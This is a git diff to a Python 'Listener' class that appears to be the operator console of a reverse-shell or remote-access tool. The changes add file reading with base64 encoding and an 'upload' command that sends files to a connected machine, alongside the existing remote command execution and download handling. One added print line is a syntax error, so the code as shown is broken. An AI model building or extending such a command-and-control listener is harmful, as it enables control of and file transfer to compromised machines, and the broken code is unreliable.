@@ -2,6 +2,8 @@ import socket, sys, json, argparse, subprocess, traceback, base64, logging, time
 from sys import getsizeof
 from itertools import cycle
 import multiprocessing, time
+logging.basicConfig(level=logging.DEBUG, format = '%(levelname)s - %(message)s')
+
 
 
 class fc: #ascii font color class
@@ -122,6 +124,30 @@ class Listener:
                 return content
 
 
+    def read_file(self,file): #file will have to be in local directory, maybe add test to make sure '/' not in file string
+            
+            readFileDict = {}
+            if '/' in file:
+                file = file.split('/') # split at dir slash, get last item 
+            file = file[-1] #last item
+            
+            try:
+                with open(file,'rb') as read_file:
+                    value = read_file.read()
+                print(type(value)) #bytes 
+                value = base64.b64encode(value) # may need to be string?
+                print(f'value,':'{value})
+                readFileDict[file] = value #dictionary with key,value == file,content
+                ##print(data)
+                return readFileDict #dictionary for download 
+            
+            except FileNotFoundError as e:
+                print(e)
+            
+            except IndexError as e:
+                print(e)
+
+    
     def executeCmd(self,cmd):
         #cmd = str(cmd).encode('utf-8')
         ##print('executeCmd')
@@ -142,7 +168,7 @@ class Listener:
             ##print(cmd)
             cmd = cmd.split(' ')
             ##print(cmd[0])
-            
+                   
             if cmd[0] == '':
                 #print(cmd)
                 cmd[0] = "\r\n" 
@@ -153,6 +179,7 @@ class Listener:
                 print(f'{fc.purple}#{fc.end}'*100)
           
             elif cmd[0] != 'bye':
+
                             
                 if cmd[0] == 'download':
                     
@@ -163,6 +190,14 @@ class Listener:
                     
                     except IndexError:
                         print('No argument for download, command not executed')
+                
+                elif cmd[0] == 'upload':
+                    print('Starting upload method')
+                    content = self.read_file(cmd[1]) #spits out dictionary with the value being a base64 encoded content
+                    cmd.append(content) # adding dictionary to list 
+                    print(cmd)
+                    self.sendStream(cmd) #don't we just want to send the payload cmd[2]?
+
  
                 else:
                     result = self.executeCmd(cmd)   
@@ -171,6 +206,9 @@ class Listener:
                     print(f'{fc.b}{result}{fc.end}')
                     print(f'{fc.purple}#{fc.end}'*100)
             
+
+            
+
             else:
                 print(f'{fc.rw}Exit call received, closing connection{fc.end}')
                 self.sendStream(cmd)
